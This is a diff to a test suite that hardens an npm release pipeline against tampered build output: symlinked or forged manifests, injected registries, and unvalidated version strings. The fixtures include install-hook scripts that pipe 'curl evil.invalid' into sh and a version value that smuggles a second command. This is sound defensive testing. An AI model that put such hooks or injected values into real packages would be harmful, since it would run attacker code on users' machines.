@@ -29,7 +29,16 @@
  */
 
 import { spawnSync } from "node:child_process";
-import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import {
+	chmodSync,
+	existsSync,
+	mkdirSync,
+	mkdtempSync,
+	readFileSync,
+	rmSync,
+	symlinkSync,
+	writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
@@ -207,7 +216,7 @@ describe("publish.yml", () => {
 	it("publish verifies, dry-runs, pushes, publishes, then releases, in that order", () => {
 		const order = [
 			jobSteps("publish").findIndex((s) => s.uses?.startsWith("actions/download-artifact@")),
-			stepIndex("publish", "Check out and verify the release commit"),
+			stepIndex("publish", "Select and verify what to publish"),
 			stepIndex("publish", "Publish packages (dry run)"),
 			stepIndex("publish", "Push the release commit and tag"),
 			stepIndex("publish", "Publish packages"),
@@ -235,7 +244,6 @@ describe("publish.yml", () => {
 			["build", "Refuse a version that is already released"],
 			["build", "Format package.json after bump"],
 			["build", "Commit and tag (local)"],
-			["publish", "Check out and verify the release commit"],
 			["publish", "Push the release commit and tag"],
 		] as const) {
 			expect(step(job, name).if ?? "", `${job}: ${name}`).toContain("!inputs.republish");
@@ -269,6 +277,30 @@ describe("publish.yml", () => {
 		expect(rel).not.toMatch(/--latest(?!=\$\{latest\})/);
 	});
 
+	it("the publish job never executes, checks out or configures from the build's output", () => {
+		for (const s of jobSteps("publish")) {
+			expect(s.run ?? "", `publish: ${s.name}`).not.toMatch(
+				/\bnode\b|\bnpx?\b|require\(|import\(|git\s+(checkout|switch|reset|restore|worktree|stash)\b|(^|[;&|]\s*)(source|\.)\s/m,
+			);
+			if (s.uses?.startsWith("actions/setup-node@")) {
+				expect(s.with?.["registry-url"], "setup-node writes no npm config").toBeUndefined();
+			}
+		}
+		// The build's reported version is read in exactly one place, which validates it.
+		const fromBuild = jobSteps("publish").filter((s) => JSON.stringify(s).includes("needs.build"));
+		expect(fromBuild.map((s) => s.name)).toEqual(["Select and verify what to publish"]);
+		for (const name of [
+			"Push the release commit and tag",
+			"Publish packages",
+			"Create GitHub Release",
+		]) {
+			expect(JSON.stringify(step("publish", name).env), name).toContain("steps.source.outputs");
+		}
+		expect(step("publish", "Push the release commit and tag").run).toMatch(
+			/"\$\{COMMIT\}:refs\/heads\/master"/,
+		);
+	});
+
 	it("only the publish step sees the npm token", () => {
 		const withToken = allSteps().filter(([, s]) => JSON.stringify(s).includes("NPM_TOKEN"));
 		expect(withToken.map(([j, s]) => `${j}: ${s.name}`)).toEqual(["publish: Publish packages"]);
@@ -290,7 +322,7 @@ const NAMES: Record<string, string> = {
 const FAKE_NPM = `#!/usr/bin/env bash
 # view <spec> version: answers from $FAKE_REGISTRY ("<spec> yes|no|error" lines; unlisted = no).
 # pack ...: writes a real tarball of ./package.json to --pack-destination; logs "pack|<dir>|<args>".
-# publish ...: records "<cwd>|<args>" in $FAKE_LOG.
+# publish <tgz> ...: records what it was given, and where, in $FAKE_LOG.
 case "$1" in
 pack)
 	echo "pack|$(basename "$PWD")|$*" >> "$FAKE_LOG"
@@ -314,7 +346,25 @@ view)
 	*) echo "npm error code E404" >&2; exit 1 ;;
 	esac
 	;;
-publish) echo "$(basename "$PWD")|$*" >> "$FAKE_LOG" ;;
+publish)
+	# Logs: tarball | flags | entries in the cwd | user config text | global config bytes.
+	shift
+	tgz="$1"
+	shift
+	flags=""
+	cfg=/dev/null
+	gcfg=/dev/null
+	while [ $# -gt 0 ]; do
+		case "$1" in
+		--userconfig) cfg="$2"; shift ;;
+		--globalconfig) gcfg="$2"; shift ;;
+		*) flags="$flags $1" ;;
+		esac
+		shift
+	done
+	cwd=$(ls -A | wc -l | tr -d ' ')
+	echo "publish|$(basename "$tgz")|\${flags# }|cwd=\${cwd}|userconfig=$(tr '\n' ';' < "$cfg")|globalconfig=$(wc -c < "$gcfg" | tr -d ' ')" >> "$FAKE_LOG"
+	;;
 *) echo "fake npm: unexpected $*" >&2; exit 99 ;;
 esac
 `;
@@ -448,13 +498,14 @@ function packAll(): string {
 const published = (version: string, dirs: string[], dry: boolean) =>
 	dirs.map(
 		(d) =>
-			`tarballs|publish ./${NAMES[d]}-${version}.tgz --access public --provenance${dry ? " --dry-run" : ""}`,
+			`publish|${NAMES[d]}-${version}.tgz|--access public --provenance --registry https://registry.npmjs.org/${dry ? " --dry-run" : ""}|cwd=0|userconfig=${dry ? "" : `//registry.npmjs.org/:_authToken=$${"{"}NODE_AUTH_TOKEN};`}|globalconfig=0`,
 	);
 
 function run(args: string[], env: Record<string, string> = {}) {
 	const r = spawnSync("bash", [join(repo, "scripts/release.sh"), ...args], {
 		cwd: repo,
 		encoding: "utf8",
+		timeout: 20_000,
 		env: {
 			...gitEnv(),
 			PATH: `${join(dir, "bin")}:${process.env.PATH}`,
@@ -534,14 +585,14 @@ describe("release.sh pack", { timeout: 30_000 }, () => {
 describe("release.sh publish", { timeout: 30_000 }, () => {
 	it("dry run: the real publish command plus --dry-run, for every tarball, in order", () => {
 		const out = packAll();
-		const r = run(["publish", out, "--dry-run"]);
+		const r = run(["publish", out, "HEAD", "--dry-run"]);
 		expect(r.status).toBe(0);
 		expect(log()).toEqual(published("1.0.0", DIRS, true));
 	});
 
 	it("real run: the same command without --dry-run", () => {
 		const out = packAll();
-		const r = run(["publish", out]);
+		const r = run(["publish", out, "HEAD"]);
 		expect(r.status).toBe(0);
 		expect(log()).toEqual(published("1.0.0", DIRS, false));
 	});
@@ -549,7 +600,7 @@ describe("release.sh publish", { timeout: 30_000 }, () => {
 	it("skips a version already on npm (finishing a partial publish)", () => {
 		const out = packAll();
 		setRegistry(["usertrust@1.0.0 yes", "usertrust-verify@1.0.0 yes"]);
-		const r = run(["publish", out]);
+		const r = run(["publish", out, "HEAD"]);
 		expect(r.status).toBe(0);
 		expect(log()).toEqual(published("1.0.0", DIRS.slice(2), false));
 	});
@@ -557,7 +608,7 @@ describe("release.sh publish", { timeout: 30_000 }, () => {
 	it("an unreadable registry stops it before that package, never reads as 'not published'", () => {
 		const out = packAll();
 		setRegistry(["usertrust-openclaw@1.0.0 error"]);
-		const r = run(["publish", out]);
+		const r = run(["publish", out, "HEAD"]);
 		expect(r.status).not.toBe(0);
 		expect(r.err).toContain("usertrust-openclaw@1.0.0");
 		expect(log()).toEqual(published("1.0.0", DIRS.slice(0, 2), false));
@@ -566,7 +617,7 @@ describe("release.sh publish", { timeout: 30_000 }, () => {
 	it("publishes nothing if any tarball is missing", () => {
 		const out = packAll();
 		rmSync(join(out, "usertrust-ui-1.0.0.tgz"));
-		const r = run(["publish", out]);
+		const r = run(["publish", out, "HEAD"]);
 		expect(r.status).not.toBe(0);
 		expect(r.err).toContain("usertrust-ui-1.0.0.tgz is missing");
 		expect(log()).toEqual([]);
@@ -588,9 +639,9 @@ describe("release.sh publish", { timeout: 30_000 }, () => {
 			"package",
 		]);
 		expect(t.status).toBe(0);
-		const r = run(["publish", out]);
+		const r = run(["publish", out, "HEAD"]);
 		expect(r.status).not.toBe(0);
-		expect(r.err).toContain("holds usertrust-server@1.0.9");
+		expect(r.err).toContain('version is "1.0.9", not 1.0.0');
 		expect(log()).toEqual([]);
 	});
 
@@ -600,7 +651,8 @@ describe("release.sh publish", { timeout: 30_000 }, () => {
 			join(repo, "packages/ui/package.json"),
 			JSON.stringify({ name: "usertrust-ui", version: "1.0.1" }),
 		);
-		const r = run(["publish", out, "--dry-run"]);
+		git("commit", "-q", "-am", "ui drifts");
+		const r = run(["publish", out, "HEAD", "--dry-run"]);
 		expect(r.status).not.toBe(0);
 		expect(r.err).toContain("packages/ui is at 1.0.1");
 		expect(log()).toEqual([]);
@@ -608,7 +660,8 @@ describe("release.sh publish", { timeout: 30_000 }, () => {
 
 	it("rejects an unknown flag, and a missing directory", () => {
 		const out = packAll();
-		expect(run(["publish", out, "--force"]).status).not.toBe(0);
+		expect(run(["publish", out, "HEAD", "--force"]).status).not.toBe(0);
+		expect(run(["publish", out]).status).not.toBe(0);
 		expect(run(["publish", "--dry-run"]).status).not.toBe(0);
 		expect(run(["publish"]).status).not.toBe(0);
 		expect(log()).toEqual([]);
@@ -877,7 +930,7 @@ describe("release.sh gate (republish)", { timeout: 30_000 }, () => {
 	it("refuses when there is no tag for the version", () => {
 		const r = run(["gate"], { REPUBLISH: "true" });
 		expect(r.status).not.toBe(0);
-		expect(r.err).toContain("tag v1.0.0 does not exist");
+		expect(r.err).toContain("Tag v1.0.0 does not exist");
 	});
 
 	it("refuses a 'release commit' that changes more than the version field", () => {
@@ -899,7 +952,7 @@ describe("release.sh gate (republish)", { timeout: 30_000 }, () => {
 		git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
 		const r = run(["gate"], { REPUBLISH: "true" });
 		expect(r.status).not.toBe(0);
-		expect(r.err).toContain("changes README");
+		expect(r.err).toContain("changes 'README', which is not one of the six");
 	});
 });
 
@@ -944,5 +997,228 @@ describe("release.sh latest-flag", { timeout: 30_000 }, () => {
 		const r = run(["latest-flag", "1.3.0"]);
 		expect(r.status).not.toBe(0);
 		expect(r.err).toContain("Could not fetch tags");
+	});
+});
+
+// ── Everything from the build job is untrusted data ──
+
+describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
+	const marker = () => join(dir, "EXECUTED");
+	const evil = (file: string) =>
+		writeFileSync(
+			file,
+			`require("node:fs").writeFileSync(${JSON.stringify(marker())}, "ran");\nmodule.exports = { name: "usertrust", version: "1.0.0" };\n`,
+		);
+	const manifestFor = (d: string, version: string, extra: Record<string, unknown> = {}) =>
+		`${JSON.stringify({ name: NAMES[d], version, license: "Apache-2.0", ...extra }, null, "\t")}\n`;
+
+	describe("a manifest in the working tree is read without following or executing it", () => {
+		it("refuses a package.json that is a symlink to a .js file, and never runs it", () => {
+			evil(join(repo, "evil.js"));
+			rmSync(join(repo, "packages/core/package.json"));
+			symlinkSync("../../evil.js", join(repo, "packages/core/package.json"));
+			const r = run(["version"]);
+			expect(r.status).not.toBe(0);
+			expect(r.err).toContain("cannot be opened as a regular file");
+			expect(existsSync(marker())).toBe(false);
+		});
+
+		it("refuses a package.json that is a symlink to a valid manifest elsewhere", () => {
+			writeFileSync(join(repo, "elsewhere.json"), manifestFor("core", "1.0.0"));
+			rmSync(join(repo, "packages/core/package.json"));
+			symlinkSync("../../elsewhere.json", join(repo, "packages/core/package.json"));
+			const r = run(["version"]);
+			expect(r.status).not.toBe(0);
+			expect(r.err).toContain("cannot be opened as a regular file");
+		});
+
+		it("refuses a package.json that is a FIFO, without waiting on it", () => {
+			rmSync(join(repo, "packages/core/package.json"));
+			expect(spawnSync("mkfifo", [join(repo, "packages/core/package.json")]).status).toBe(0);
+			const r = run(["version"]);
+			expect(r.status).not.toBe(0);
+			expect(r.status).not.toBeNull();
+			expect(r.err).toContain("is not a regular file");
+		});
+	});
+
+	describe("a manifest in a commit is read as a git blob of mode 100644 only", () => {
+		const commitWith = (link: (path: string) => void) => {
+			writePackages("1.0.1");
+			link(join(repo, "packages/core/package.json"));
+			git("add", "-A");
+			git("commit", "-q", "-m", "release: v1.0.1");
+			git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
+		};
+
+		it("refuses a committed package.json that is a symlink to a .cjs file, and never runs it", () => {
+			evil(join(repo, "evil.cjs"));
+			commitWith((p) => {
+				rmSync(p);
+				symlinkSync("../../evil.cjs", p);
+			});
+			for (const args of [["release-parent"], ["version-at", "HEAD"]]) {
+				const r = run(args);
+				expect(r.status, args.join(" ")).not.toBe(0);
+				expect(r.err).toContain("is not a regular file (tree entry");
+			}
+			expect(existsSync(marker())).toBe(false);
+		});
+
+		it("refuses a committed package.json that is executable (100755)", () => {
+			commitWith((p) => chmodSync(p, 0o755));
+			const r = run(["release-parent"]);
+			expect(r.status).not.toBe(0);
+			expect(r.err).toContain("is not a regular file (tree entry");
+		});
+	});
+
+	describe("the build job's bundle", () => {
+		/** The build job's work, in a clone: bump, commit, tag, bundle on top of the base. */
+		const bundleFrom = (arrange: (clone: string) => void = () => {}) => {
+			const clone = join(dir, "build");
+			gitIn(dir, "clone", "-q", repo, clone);
+			const base = gitIn(clone, "rev-parse", "HEAD");
+			const saved = repo;
+			repo = clone;
+			writePackages("1.0.1");
+			arrange(clone);
+			git("add", "-A");
+			git("commit", "-q", "-m", "release: v1.0.1");
+			git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
+			const bundle = join(dir, "release.bundle");
+			git("bundle", "create", "-q", bundle, "refs/tags/v1.0.1", `^${base}`);
+			repo = saved;
+			return bundle;
+		};
+
+		it("a version bump on this run's commit is accepted, and the commit printed", () => {
+			const bundle = bundleFrom();
+			const r = run(["verify-release", bundle, "1.0.1"]);
+			expect(r.status).toBe(0);
+			expect(r.out.trim()).toBe(git("rev-parse", "refs/tags/v1.0.1^{commit}"));
+		});
+
+		for (const bad of ["1.0.1;touch x", "../../x", "1.0", "1.0.1-rc.1", "v1.0.1", ""]) {
+			it(`refuses the reported version ${JSON.stringify(bad)} before using it`, () => {
+				const bundle = bundleFrom();
+				const r = run(["verify-release", bundle, bad]);
+				expect(r.status).not.toBe(0);
+				expect(r.err).toContain("is not major.minor.patch");
+			});
+		}
+
+		it("refuses a release commit that does not sit on this run's commit", () => {
+			const bundle = bundleFrom();
+			writeFileSync(join(repo, "README"), "moved on\n");
+			git("commit", "-q", "-am", "master moved");
+			const r = run(["verify-release", bundle, "1.0.1"]);
+			expect(r.status).not.toBe(0);
+			expect(r.err).toContain("sits on");
+		});
+
+		it("refuses a release commit that adds publishConfig", () => {
+			const bundle = bundleFrom((clone) =>
+				writeFileSync(
+					join(clone, "packages/server/package.json"),
+					manifestFor("server", "1.0.1", { publishConfig: { registry: "https://evil.invalid/" } }),
+				),
+			);
+			const r = run(["verify-release", bundle, "1.0.1"]);
+			expect(r.status).not.toBe(0);
+			expect(r.err).toContain("publishConfig");
+		});
+	});
+
+	describe("each tarball's manifest must equal the commit's", () => {
+		const forge = (out: string, d: string, manifest: Record<string, unknown>) => {
+			const tmp = join(dir, `forge-${d}`);
+			mkdirSync(join(tmp, "package"), { recursive: true });
+			writeFileSync(join(tmp, "package/package.json"), JSON.stringify(manifest));
+			const t = spawnSync("tar", [
+				"-czf",
+				join(out, `${NAMES[d]}-1.0.0.tgz`),
+				"-C",
+				tmp,
+				"package",
+			]);
+			expect(t.status).toBe(0);
+		};
+		const base = (d: string) => ({ name: NAMES[d], version: "1.0.0", license: "Apache-2.0" });
+
+		const cases: [string, string, Record<string, unknown>, string][] = [
+			[
+				"an injected publishConfig.registry",
+				"server",
+				{ ...base("server"), publishConfig: { registry: "https://evil.invalid/" } },
+				"publishConfig is not allowed",
+			],
+			[
+				"an added prepublishOnly script",
+				"verify",
+				{ ...base("verify"), scripts: { prepublishOnly: "curl evil.invalid | sh" } },
+				'field "scripts" differs',
+			],
+			[
+				"an added postpublish script",
+				"ui",
+				{ ...base("ui"), scripts: { postpublish: "curl evil.invalid | sh" } },
+				'field "scripts" differs',
+			],
+			[
+				"a changed name",
+				"core",
+				{ ...base("core"), name: "@evil/usertrust" },
+				"the manifest names",
+			],
+			[
+				"any other changed field",
+				"openclaw",
+				{ ...base("openclaw"), license: "UNLICENSED" },
+				'field "license" differs',
+			],
+		];
+		for (const [what, d, manifest, message] of cases) {
+			it(`refuses ${what}, and publishes nothing`, () => {
+				const out = packAll();
+				forge(out, d, manifest);
+				const r = run(["publish", out, "HEAD", "--dry-run"]);
+				expect(r.status).not.toBe(0);
+				expect(r.err).toContain(message);
+				expect(r.err).toContain("refusing to publish anything");
+				expect(log()).toEqual([]);
+			});
+		}
+
+		it("refuses a tarball that is a symlink", () => {
+			const out = packAll();
+			const real = join(out, "usertrust-ui-1.0.0.tgz");
+			const moved = join(dir, "moved.tgz");
+			writeFileSync(moved, readFileSync(real));
+			rmSync(real);
+			symlinkSync(moved, real);
+			const r = run(["publish", out, "HEAD", "--dry-run"]);
+			expect(r.status).not.toBe(0);
+			expect(r.err).toContain("not a regular file");
+			expect(log()).toEqual([]);
+		});
+	});
+
+	describe("a changed path is a literal string, never a pattern", () => {
+		for (const weird of ["[c]ore", "co*e", "co?e", "core x", "core "]) {
+			it(`refuses a release commit that also changes packages/${weird}/package.json`, () => {
+				writePackages("1.0.1");
+				mkdirSync(join(repo, "packages", weird), { recursive: true });
+				writeFileSync(join(repo, "packages", weird, "package.json"), manifestFor("core", "1.0.1"));
+				git("add", "-A");
+				git("commit", "-q", "-m", "release: v1.0.1");
+				git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
+				const r = run(["release-parent"]);
+				expect(r.status).not.toBe(0);
+				expect(r.err).toContain(
+					`changes 'packages/${weird}/package.json', which is not one of the six`,
+				);
+			});
+		}
 	});
 });
